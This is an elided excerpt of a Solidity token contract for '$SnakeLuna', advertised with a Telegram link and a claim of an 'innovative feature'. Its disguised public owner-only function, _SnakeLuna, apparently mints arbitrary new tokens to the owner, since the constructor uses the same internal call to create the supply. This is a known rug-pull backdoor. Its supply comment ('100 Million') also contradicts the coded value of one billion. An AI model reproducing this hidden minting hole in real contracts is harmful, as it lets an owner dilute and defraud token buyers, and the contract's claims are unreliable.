...
//
// $SnakeLuna proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SnakeLunaBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SnakeLuna(uint256 amount) public onlyOwner {
 _SnakeLuna(msg.sender, amount);
    }
    ...
    function _SnakeLuna(address account, uint256 amount) internal virtual {
...
contract $SnakeLuna is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Snake Luna", "SNAKELUNA") {
     _SnakeLuna(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}